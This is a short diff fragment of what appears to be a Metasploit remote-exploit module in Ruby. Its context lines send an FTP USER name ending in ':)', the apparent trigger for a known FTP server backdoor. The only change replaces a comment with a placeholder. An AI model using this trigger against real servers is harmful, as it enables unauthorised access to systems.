@@ -176,5 +176,6 @@ class Metasploit3 < Msf::Exploit::Remote
                 sock.put("USER #{rand_text_alphanumeric(rand(6)+1)}:)\r\n")
                 resp = sock.get_once(-1, 30).to_s
                 print_status("USER: #{resp.strip}")
-# More Ruby Code 
+
+# More Ruby Code HERE.....
 ```
